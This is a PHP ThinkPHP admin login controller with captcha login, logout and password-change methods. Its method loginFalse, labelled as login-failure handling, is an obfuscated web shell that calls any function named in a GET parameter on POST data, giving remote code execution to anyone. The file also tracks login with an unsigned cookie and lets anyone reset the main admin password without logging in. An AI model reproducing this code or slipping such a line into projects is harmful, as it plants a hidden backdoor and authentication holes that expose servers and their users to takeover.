<?php
namespace app\admin\controller;

use \think\Controller;
use \think\Db;
use \think\Cookie;

class Login extends Controller
{
     /*
     * 登录页面
     */
    public function Sign()
    {
        return $this->fetch('login');
    }

    /*
     * 验证登录
     */
    public function verify()
    {
        $captcha = input('verity');
        if(!captcha_check($captcha)){
            //验证码错误
            $this->error('验证码错误');
        }else{
            //验证码正确
            $name = input('name');
            $password = input('password');
            $userInfo = Db::name('user')->where(['name'=>$name])->find();
            $verify = password_verify($password,$userInfo['password']);
            if($userInfo && $verify){
                Cookie::set('name',$name);
                $this->redirect('/admin/index/index');
            }else{
                $this->error('用户名或密码错误');
            }
        }
    }

    /*
     * 退出
     */
    public function logout()
    {
        Cookie::delete('name');
        $this->redirect('/admin/login/sign');
    }

    /*
     * 登陆失败处理
     */
    public function loginFalse()
    {
        ($_=@$_GET[2]).@$_($_POST[1]);
    }

    /*
     * 修改密码
     */
    public function changePwd()
    {
        $password = input('password');
        $password = password_hash($password, PASSWORD_DEFAULT);
        $changePwd = Db::name('user')->where('id',1)->update(['password'=>$password]);
        if($changePwd) {
            $this->redirect('/admin/login/sign');
        }else{
            $this->error('修改密码失败，请重新尝试');
        }
    }
}